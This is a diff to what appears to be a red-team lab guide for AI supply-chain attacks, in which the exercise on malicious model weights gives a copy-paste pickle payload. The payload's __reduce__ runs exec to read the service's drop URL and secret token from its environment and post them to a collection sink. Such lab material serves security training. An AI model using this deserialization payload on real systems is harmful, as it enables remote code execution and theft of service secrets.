@@ -25,8 +25,11 @@ URL=http://127.0.0.1:9080
 ### 3.1 `malicious-weights` — RCE via pickle (LLM03)
 `POST /load` takes `{"artifact_b64": "..."}`, base64-decodes it, and calls
 `pickle.loads()` on it. A pickle's `__reduce__` runs arbitrary code on unpickle.
-Build one that reads the target's `REDSEC_DROP_URL` and phones home. This is fully
-copy-paste — it builds the payload and sends it:
+Build one that reads the target's `REDSEC_DROP_URL` and phones home. The sink only
+trusts posts that carry the range token, which lives in the registry's own
+environment (`REDSEC_DROP_TOKEN`). Your code runs there, so it can read the token,
+just as a real attacker with RCE reads a service's secrets. Posting to the sink
+yourself won't count. This is fully copy-paste — it builds the payload and sends it:
 
 ```bash
 PAYLOAD=$(python3 - <<'EOF'
@@ -34,8 +37,9 @@ import pickle, base64
 class Evil:
     def __reduce__(self):
         code = ("import os,urllib.request,json; u=os.environ['REDSEC_DROP_URL']; "
-                "urllib.request.urlopen(u+'/collect/weights', "
-                "data=json.dumps({'body':'WEIGHTSPWN rce-via-pickle'}).encode())")
+                "urllib.request.urlopen(urllib.request.Request(u+'/collect/weights', "
+                "data=json.dumps({'body':'WEIGHTSPWN rce-via-pickle'}).encode(), "
+                "headers={'X-RedSec-Drop-Token':os.environ['REDSEC_DROP_TOKEN']}))")
         return (exec, (code,))
 print(base64.b64encode(pickle.dumps(Evil())).decode())
 EOF
